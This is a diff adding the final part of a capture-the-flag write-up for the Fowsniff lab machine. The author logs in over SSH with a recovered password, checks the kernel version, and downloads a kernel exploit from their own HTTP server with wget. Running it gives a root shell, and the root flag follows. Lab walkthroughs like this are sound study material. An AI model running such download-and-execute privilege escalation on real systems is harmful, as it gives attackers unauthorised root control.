@@ -252,3 +252,73 @@ PS: Make sure you change your email password.
 AJ had been telling us to do that right before Captain Profanity showed up.
 
 ```
+
+
+Let's ssh in as `baksteen:S1ck3nBluff+secureshell`.
+```
+baksteen@fowsniff:~$ uname -a
+Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+baksteen@fowsniff:~$ cat /etc/lsb-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
+
+```
+
+Looking online, there is an exploit for this version of linux. I downloaded the code and compiled it on my machine. I then spun up a http server using python then downloaded it to the target machine.
+```
+baksteen@fowsniff:~$ wget 10.8.248.108:8000/exploit
+--2021-12-11 17:48:34--  http://10.8.248.108:8000/exploit
+Connecting to 10.8.248.108:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 17304 (17K) [application/octet-stream]
+Saving to: ‘exploit’
+
+exploit                      100%[=============================================>]  16.90K   102KB/s    in 0.2s    
+
+2021-12-11 17:48:35 (102 KB/s) - ‘exploit’ saved [17304/17304]
+
+baksteen@fowsniff:~$ ./exploit
+-bash: ./exploit: Permission denied
+baksteen@fowsniff:~$ chmod +x exploit
+baksteen@fowsniff:~$ ./exploit
+task_struct = ffff88001f202a00
+uidptr = ffff88001eca10c4
+spawning root shell
+root@fowsniff:~# whoami
+root
+
+```
+
+```
+root@fowsniff:/root# cat flag.txt
+   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&&&&&&&&&&&&&&|
+  |    R O O T   |
+  |    F L A G   |
+  |&&&&&&&&&&&&&&|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
+
+
+```
